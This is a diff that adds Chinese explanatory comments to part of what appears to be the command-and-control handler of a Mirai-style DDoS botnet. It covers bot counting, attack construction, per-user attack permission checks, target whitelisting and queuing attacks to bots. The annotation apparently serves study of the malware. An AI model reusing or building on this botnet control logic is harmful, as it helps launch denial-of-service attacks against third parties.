@@ -84,7 +84,7 @@ func (this *Admin) Handle() {
     this.conn.Write([]byte("[+] DDOS | Setting up virtual terminal...\r\n"))
     time.Sleep(1 * time.Second)
 
-    go func() {
+    go func() {   //另外一个线程，CNC与用户之间每秒更新一次当前bot的数量
         i := 0
         for {
             var BotCount int
@@ -209,7 +209,7 @@ func (this *Admin) Handle() {
         }
 
         //不是上述的几个命令的时候，就是攻击指令，否则指令出错
-        atk, err := NewAttack(cmd, userInfo.admin)
+        atk, err := NewAttack(cmd, userInfo.admin)  //构造attack攻击结构体
         if err != nil {
             this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))//输出错误信息
         } else {
@@ -217,12 +217,12 @@ func (this *Admin) Handle() {
             if err != nil {
                 this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
             } else {
-                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
+                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {  //查看数据库此用户的攻击权限
                     this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
-                } else if !database.ContainsWhitelistedTargets(atk) {
-                    clientList.QueueBuf(buf, botCount, botCatagory)
+                } else if !database.ContainsWhitelistedTargets(atk) {   //有没有白名单的Ip
+                    clientList.QueueBuf(buf, botCount, botCatagory)  //攻击
                 } else {
-                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
+                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix") //有白名单，放弃攻击
                 }
             }
         }
